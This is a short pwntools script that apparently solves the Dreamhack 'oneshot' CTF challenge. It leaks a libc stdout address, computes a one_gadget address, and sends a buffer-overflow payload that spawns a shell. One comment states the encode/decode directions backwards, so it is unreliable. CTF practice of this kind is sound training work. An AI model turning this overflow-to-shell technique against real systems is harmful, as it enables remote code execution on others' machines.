# No canary found
# NX: NX enabled
# PIE: PIE enabled

from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 23694)
e = ELF('./oneshot')
libc = ELF('./libc.so.6')

stdout_offset = libc.symbols['_IO_2_1_stdout_']
oneshot_gadget_offset = 0x45216

p.recvuntil('stdout: ')

# str -> decode() -> bytes
# bytes -> encode() -> str
# stdout_addr = int(p.recvuntil("\n")[:-1], 16)
# stdout_addr = int(p.recvuntil("\n"), 16)
stdout_addr = int((p.recvuntil("\n").decode('utf-8').strip("\n")).encode('utf-8'), 16)
print("stdout_addr : " + hex(stdout_addr))

libc_base = stdout_addr - stdout_offset
oneshot_gadget_addr = libc_base + oneshot_gadget_offset

print("stdout: " + hex(stdout_addr))
print("libc_base : " + hex(libc_base))

payload = b"a" * 0x18 + p64(0) + b"b" * 0x8 + p64(oneshot_gadget_addr)
p.sendafter("MSG: ", payload)

p.interactive()
